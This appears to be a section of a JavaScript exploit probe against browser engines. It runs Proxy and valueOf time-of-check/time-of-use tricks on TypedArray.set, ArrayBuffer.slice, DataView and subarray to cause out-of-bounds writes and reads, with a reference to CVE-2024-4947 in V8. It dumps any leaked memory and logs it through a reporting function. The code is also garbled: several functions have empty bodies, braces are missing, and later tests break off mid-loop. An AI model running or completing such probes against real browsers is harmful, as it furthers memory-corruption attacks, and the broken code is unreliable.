// ============================================================
// SECTION A: PROXY TOCTOU ON TYPEDARRAY OPERATIONS
// If the engine reads a Proxy-backed length/offset twice
// (once to validate, once to use), returning different values
// can bypass bounds checks.
// This is the CVE-2024-4947 class (V8 Maglev).
// ============================================================
async function sectionA() {
  log('warn', '=== A: PROXY TOCTOU (TypedArray) ===');
  var anomalies = 0;

  // A1: TypedArray.prototype.set() with toggling source length
  try {
    for (var round = 0; round < 50; round++) {
      var target = new Float64Array(4); // small target
      var callCount = 0;

      // Proxy that changes length on second access
      var fakeArray = new Proxy({}, {
        get: function(obj, prop) {
          if (prop === 'length') {
            callCount++;
            // First access: report small length (passes validation)
            // Second access: report huge length (causes OOB write)
            return callCount <= 1 ? 2 : 1000;
          }
          if (prop === Symbol.iterator) return undefined;
          // Return controllable values for any index
          var idx = parseInt(prop);
          if (!isNaN(idx)) return 3.14159 + idx;
          return undefined;
        },
        has: function(obj, prop) { return true; }
      });

      try {
        target.set(fakeArray);
      } catch(e) {
        // Expected - engine should catch the mismatch
      }

      // Check if target was corrupted beyond its bounds
      // Read adjacent memory via BigUint64Array view of same buffer
      var u64 = new BigUint64Array(target.buffer);
      for (var i = 0; i < u64.length; i++) {
        if (u64[i] !== 0n && u64[i] !== BigInt(Math.floor(3.14159 + i))) {
          // Unexpected value - possible OOB write corruption
          anomalies++;
          B('A1-CORRUPT', 'round:' + round + '|idx:' + i + '|val:' + u64[i].toString(16));
          log('crit', '[A1-' + round + '] CORRUPT at idx ' + i + ': 0x' + u64[i].toString(16));
        }
      }
    }
    B('A1-SET', 'anomalies:' + anomalies);
    log(anomalies > 0 ? 'crit' : 'ok', '[A1] TypedArray.set() proxy length toggle: ' + anomalies + '/50');
  } catch(e) {
    B('A1-ERR', e.message);
    log('fail', '[A1] ' + e.message);
  }

  // A2: ArrayBuffer.prototype.slice with proxy-backed start/end
  try {
    var sliceAnom = 0;
    for (var round = 0; round < 50; round++) {
      var buf = new ArrayBuffer(64);
      var view = new Uint8Array(buf);
      for (var i = 0; i < 64; i++) view[i] = 0xAA;

      var startCalls = 0;
      var proxyStart = { valueOf: function() {
        startCalls++;

      }};
      var endCalls = 0;
      var proxyEnd = { valueOf: function() {
        endCalls++;

      }};

      try {
        var sliced = buf.slice(proxyStart, proxyEnd);
        // Check if we got more data than expected
        if (sliced.byteLength > 64) {
          sliceAnom++;
          B('A2-OOB', 'round:' + round + '|len:' + sliced.byteLength);
          log('crit', '[A2-' + round + '] OOB slice! len=' + sliced.byteLength);
          // Dump the extra bytes for analysis
          var extra = new Uint8Array(sliced);
          var hexStr = '';
          for (var i = 64; i < Math.min(extra.length, 128); i++) {
            hexStr += extra[i].toString(16).padStart(2, '0');
          }
          B('A2-DUMP', hexStr.substring(0, 200));
        }
      } catch(e) { /* expected bounds error */ }
    }
    B('A2-SLICE', 'anomalies:' + sliceAnom);
    log(sliceAnom > 0 ? 'crit' : 'ok', '[A2] AB.slice() proxy args: ' + sliceAnom + '/50');
    anomalies += sliceAnom;
  } catch(e) {
    B('A2-ERR', e.message);
  }

  // A3: DataView construction with toggling byteOffset/byteLength
  try {
    var dvAnom = 0;
    for (var round = 0; round < 50; round++) {
      var buf = new ArrayBuffer(32);
      var offsetCalls = 0;
      var proxyOffset = { valueOf: function() {
        offsetCalls++;
        return offsetCalls <= 1 ? 0 : 24; // shift offset on second read
      }};
      var lenCalls = 0;
      var proxyLen = { valueOf: function() {
        lenCalls++;
        return lenCalls <= 1 ? 8 : 32; // expand length on second read
      }};

      try {
        var dv = new DataView(buf, proxyOffset, proxyLen);
        // If offset=24 and length=32, that's OOB (24+32 > 32)
        // Try to read past the buffer
        try {
          var val = dv.getBigUint64(24); // should be OOB if length was expanded
          dvAnom++;
          B('A3-OOB-READ', 'round:' + round + '|val:0x' + val.toString(16));
          log('crit', '[A3-' + round + '] OOB DataView read! val=0x' + val.toString(16));
        } catch(e2) { /* expected RangeError */ }

    log(dvAnom > 0 ? 'crit' : 'ok', '[A3] DataView proxy offset/len: ' + dvAnom + '/50');
    anomalies += dvAnom;
  } catch(e) {
    B('A3-ERR', e.message);

  // A4: TypedArray.prototype.subarray with valueOf TOCTOU
  try {
    var subAnom = 0;
    for (var round = 0; round < 50; round++) {
      var src = new Uint8Array(16);
      for (var i = 0; i < 16; i++) src[i] = i;

      var beginCalls = 0;
      var proxyBegin = { valueOf: function() {
        beginCalls++;

    log(subAnom > 0 ? 'crit' : 'ok', '[A4] subarray+detach race: ' + subAnom + '/50');
    anomalies += subAnom;
  } catch(e) {
    B('A4-ERR', e.message);
  }

  B('A-DONE', 'total:' + anomalies);
  log(anomalies > 0 ? 'crit' : 'ok', '[A] PROXY TOCTOU total: ' + anomalies);
  return anomalies;
}
